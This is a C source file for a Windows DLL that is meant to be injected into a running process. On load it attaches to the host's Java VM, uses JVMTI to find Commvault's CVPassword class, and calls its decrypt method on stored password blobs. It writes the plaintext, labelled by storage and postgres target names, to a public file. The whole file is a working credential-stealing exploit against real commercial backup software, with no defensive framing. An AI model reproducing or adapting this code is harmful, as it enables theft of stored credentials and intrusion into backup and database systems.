#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <jni.h>
#include <jvmti.h>

DWORD WINAPI go(LPVOID _) {
    FILE* f = fopen("C:\\Users\\Public\\o.txt", "w");
    if (!f) return 1;

    typedef jint (JNICALL *GetVMs)(JavaVM**, jsize, jsize*);
    GetVMs gv = (GetVMs)GetProcAddress(GetModuleHandleA("jvm.dll"), "JNI_GetCreatedJavaVMs");
    if (!gv) { fprintf(f,"no export\n"); fclose(f); return 2; }

    JavaVM* vm; jsize n;
    if (gv(&vm,1,&n) || !n) { fprintf(f,"no vm\n"); fclose(f); return 3; }

    JNIEnv* env;
    if ((*vm)->AttachCurrentThread(vm,(void**)&env,NULL)) { fprintf(f,"attach fail\n"); fclose(f); return 4; }

    jvmtiEnv* ti = NULL;
    if ((*vm)->GetEnv(vm,(void**)&ti,JVMTI_VERSION_1_2) || !ti) { fprintf(f,"no jvmti\n"); fclose(f); return 5; }

    jint cc; jclass* classes;
    if ((*ti)->GetLoadedClasses(ti,&cc,&classes) != JVMTI_ERROR_NONE) { fprintf(f,"GetLoadedClasses fail\n"); fclose(f); return 6; }
    jclass cls = NULL;
    for (jint i=0;i<cc;i++){
        char* sig=NULL;
        if ((*ti)->GetClassSignature(ti,classes[i],&sig,NULL)==JVMTI_ERROR_NONE && sig){
            if (strcmp(sig,"Lcommvault/qnet/sys/CVPassword;")==0) cls = (jclass)(*env)->NewGlobalRef(env, classes[i]);
            (*ti)->Deallocate(ti,(unsigned char*)sig);
        }
        if (cls) break;
    }
    (*ti)->Deallocate(ti,(unsigned char*)classes);
    if (!cls){ fprintf(f,"CVPassword not found\n"); fclose(f); return 7; }

    jmethodID ctor    = (*env)->GetMethodID(env, cls, "<init>", "()V");
    jmethodID decrypt = (*env)->GetMethodID(env, cls, "decrypt", "(Ljava/lang/String;)Ljava/lang/String;");
    if ((*env)->ExceptionCheck(env)) (*env)->ExceptionClear(env);
    if (!ctor || !decrypt){ fprintf(f,"ctor=%p decrypt=%p\n",(void*)ctor,(void*)decrypt); fclose(f); return 8; }

    jobject obj = (*env)->NewObject(env, cls, ctor);
    if ((*env)->ExceptionCheck(env)){ (*env)->ExceptionClear(env); }
    if (!obj){ fprintf(f,"NewObject failed\n"); fclose(f); return 9; }

    fprintf(f,"CVPassword ready\n\n");

    const char* blobs[] = {
        "BLOB",
        "BLOB",
        NULL
    };
    const char* names[] = {
        "s-xxx.cmv01", "s-xx.cmv01", "s-xxx.cmvt01",
        "xxxx-vastnas01", "xxxx-vastnas01", "xxxs-vastnas01",
        "postgres_11", "postgres_12", "postgres_13",
        "jobresultsdir", NULL
    };

    for (int i=0; blobs[i]; i++){
        jstring in  = (*env)->NewStringUTF(env, blobs[i]);
        jstring out = (jstring)(*env)->CallObjectMethod(env, obj, decrypt, in);
        if ((*env)->ExceptionCheck(env)){
            (*env)->ExceptionClear(env);
            fprintf(f,"%s => EXCEPTION\n", names[i]);
        } else if (out){
            const char* s = (*env)->GetStringUTFChars(env, out, NULL);
            fprintf(f,"%s => %s\n", names[i], s?s:"(nullchars)");
            if (s) (*env)->ReleaseStringUTFChars(env, out, s);
        } else {
            fprintf(f,"%s => null\n", names[i]);
        }
        if (in)  (*env)->DeleteLocalRef(env, in);
        if (out) (*env)->DeleteLocalRef(env, out);
    }

    (*env)->DeleteGlobalRef(env, cls);
    fclose(f);
    (*vm)->DetachCurrentThread(vm);
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID l){
    if (r==DLL_PROCESS_ATTACH){ DisableThreadLibraryCalls(h); CreateThread(0,0,go,0,0,0); }
    return TRUE;
}
